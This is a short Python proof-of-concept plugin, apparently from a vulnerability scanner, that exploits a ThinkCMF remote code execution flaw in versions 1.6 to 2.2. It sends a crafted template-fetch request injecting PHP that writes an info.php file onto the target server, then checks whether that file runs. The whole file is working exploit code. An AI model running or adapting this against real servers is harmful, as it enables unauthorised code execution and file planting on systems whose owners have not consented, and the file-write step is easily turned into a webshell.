#!/usr/bin/env python
# -*- coding: utf-8 -*-
import HackRequests


def poc(arg, **kwargs):
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    check_poc = '/?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents(\'info.php\',\'<?php phpinfo(); ?>\')</php>'

    verify_url = arg + check_poc
    check_url= arg+'/info.php'

    hh = HackRequests.hackRequests()
    try:
        r = hh.http(verify_url,headers=headers)

        rr=hh.http(check_url,headers=headers,timeout=3)
        if  'PHP Extension' in  rr.text():
            result = {
                "name": "thinkcmf REC",  # 插件名称
                "content": '''影响版本1.6/2.0/2.1/2.2''',  # 插件返回内容详情，会造成什么后果。
                "url": arg,  # 漏洞存在url
                "log": r.log,
                "tag": "REC"  # 漏洞标签
            }
            return result
        else:
            pass
    except:
        return False

if __name__ == "__main__":
    pass